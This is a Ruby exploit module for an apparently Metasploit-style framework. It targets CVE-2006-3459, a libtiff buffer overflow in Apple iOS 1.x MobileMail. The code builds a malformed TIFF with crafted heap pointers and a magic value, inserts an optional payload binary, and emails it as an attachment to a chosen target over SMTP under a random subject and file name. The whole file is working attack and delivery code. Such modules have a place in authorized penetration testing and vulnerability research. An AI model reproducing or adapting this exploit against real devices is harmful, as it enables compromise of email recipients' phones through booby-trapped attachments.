# frozen_string_literal: true

require 'net/smtp'
require 'securerandom'
require 'base64'
require_relative '../../lib/apex_module'

module ApexFramework
  module Modules
    class MobilemailLibtiff < ApexModule

      info(
        name:            'Apple iOS MobileMail LibTIFF Buffer Overflow',
        category:        'email',
        rank:            'good',
        description:     'Exploits a buffer overflow in libtiff via email attachment on iOS 1.x.',
        authors:         ['hdm', 'kf'],
        references:      [
          { type: 'CVE', id: '2006-3459' },
          { type: 'OSVDB', id: '27723' },
          { type: 'BID', id: '19283' }
        ],
        disclosure_date: '2006-08-01',
        platform:        'osx',
        arch:            'armle'
      )

      register_option :SMTP_HOST,    type: :string, required: true,  description: 'SMTP server address'
      register_option :SMTP_PORT,    type: :port,   required: true,  default: 25, description: 'SMTP port'
      register_option :MAILFROM,     type: :string, required: true,  description: 'Sender email'
      register_option :MAILTO,       type: :string, required: true,  description: 'Target email'
      register_option :SUBJECT,      type: :string, required: false, default: '', description: 'Subject (random if empty)'
      register_option :PAYLOAD_FILE, type: :string, required: false, default: '', description: 'Path to payload binary'

      HEAP  = 0x00802000
      MAGIC = 0x300d562c

      def run
        subj = get(:SUBJECT)
        subj = SecureRandom.alphanumeric(16) if subj.nil? || subj.empty?
        tiff = generate_tiff
        fname = "#{SecureRandom.alphanumeric(8)}.tiff"
        boundary = "----=_Apex_#{SecureRandom.hex(12)}"

        msg = build_mime(subj, tiff, fname, boundary)
        log_status "Sending to #{get(:MAILTO)} via #{get(:SMTP_HOST)}:#{get(:SMTP_PORT)}"

        Net::SMTP.start(get(:SMTP_HOST), get(:SMTP_PORT)) do |smtp|
          smtp.send_message(msg, get(:MAILFROM), get(:MAILTO))
        end

        log_good "Email delivered (#{msg.bytesize} bytes)"
      end

      private

      def generate_tiff
        lolz = 2048
        tiff = +"\x49\x49\x2a\x00\x1e\x00\x00\x00"
        tiff << ("\x00" * 18)
        tiff << "\x08\x00\x00\x01\x03\x00\x01\x00\x00\x00\x08\x00\x00\x00"
        tiff << "\x01\x01\x03\x00\x01\x00\x00\x00\x08\x00\x00\x00"
        tiff << "\x03\x01\x03\x00\x01\x00\x00\x00\xaa\x00\x00\x00"
        tiff << "\x06\x01\x03\x00\x01\x00\x00\x00\xbb\x00\x00\x00"
        tiff << "\x11\x01\x04\x00\x01\x00\x00\x00\x08\x00\x00\x00"
        tiff << "\x17\x01\x04\x00\x01\x00\x00\x00\x15\x00\x00\x00"
        tiff << "\x1c\x01\x03\x00\x01\x00\x00\x00\x01\x00\x00\x00"
        tiff << "\x50\x01\x03\x00"
        tiff << [lolz].pack('V')
        tiff << "\x84\x00\x00\x00\x00\x00\x00\x00"

        data = +SecureRandom.random_bytes(lolz)
        data[120, 4] = [MAGIC].pack('V')
        data[104, 4] = [HEAP - 0x30].pack('V')
        data[92, 4]  = [data.length].pack('V')
        data[116, 4] = [HEAP + 44 + 0x14].pack('V')
        data[192, 4] = [HEAP + 196].pack('V')

        p = load_payload
        data[196, p.length] = p if p

        tiff << data
      end

      def build_mime(subject, attachment, filename, boundary)
        m = +"From: #{get(:MAILFROM)}\r\nTo: #{get(:MAILTO)}\r\n"
        m << "Subject: #{subject}\r\nMIME-Version: 1.0\r\n"
        m << "Content-Type: multipart/mixed; boundary=\"#{boundary}\"\r\n\r\n"
        m << "--#{boundary}\r\nContent-Type: text/plain\r\n\r\n.\r\n"
        m << "--#{boundary}\r\nContent-Type: application/octet-stream; name=\"#{filename}\"\r\n"
        m << "Content-Transfer-Encoding: base64\r\n"
        m << "Content-Disposition: attachment; filename=\"#{filename}\"\r\n\r\n"
        m << Base64.encode64(attachment) << "\r\n--#{boundary}--\r\n"
      end

      def load_payload
        path = get(:PAYLOAD_FILE)
        return nil if path.nil? || path.empty? || !File.exist?(path)
        File.binread(path)
      end
    end
  end
end

ApexFramework::ApexModule.register_module(
  'email/mobilemail_libtiff',
  ApexFramework::Modules::MobilemailLibtiff
)
